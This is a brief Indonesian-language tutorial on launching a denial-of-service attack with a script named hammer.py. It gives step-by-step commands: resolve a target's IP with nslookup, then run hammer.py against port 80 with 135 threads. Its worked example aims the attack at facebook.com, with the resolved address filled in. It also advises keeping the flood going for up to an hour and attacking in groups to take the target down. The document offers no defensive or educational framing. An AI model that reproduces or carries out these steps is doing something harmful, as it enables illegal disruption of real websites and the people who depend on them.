pertama cari ip target dengan menggunakan nslookup!
ketikan kode di bawah ini !!
$nslookup target.com

nanti akan muncul ip target kemudian salin ip nya.
kemudian ketikan perintah

$python hammer.py -s iptarget -p 80 -t 135

untuk bagian ip target,kalian masukan ip yg tadi kalina salin.

contoh kami akan menyerang sebuah website seperti facebook.
maka yg pertama kali kami cari adalah alamat ip nya.

$nslookup facebook.com

maka akan muncul sebagai berikut : 

Server:         8.8.8.8
Address:        8.8.8.8#53

Non-authoritative answer:                                                               
Name:   facebook.com                                                                    
Address: 31.13.95.35                                                                    
Name:   facebook.com                                                                    
Address: 2a03:2880:f14d:181:face:b00c:0:25de

maka yg kami ambil adalah ip yg atas..
jadi begini perintah nya .!

$python hammer.py -s 31.13.95.35 -p 80 -t 135

maka ddos pun akan segera di mulai....
tunggu saja sampai 1/2 atau 1 jam agar target bisa lumpuh.
dan agar bisa mendapat hasio maksimal,maka serangan ddos harus di lakukan secara berkelompok alias bukan hanya seorang diri.

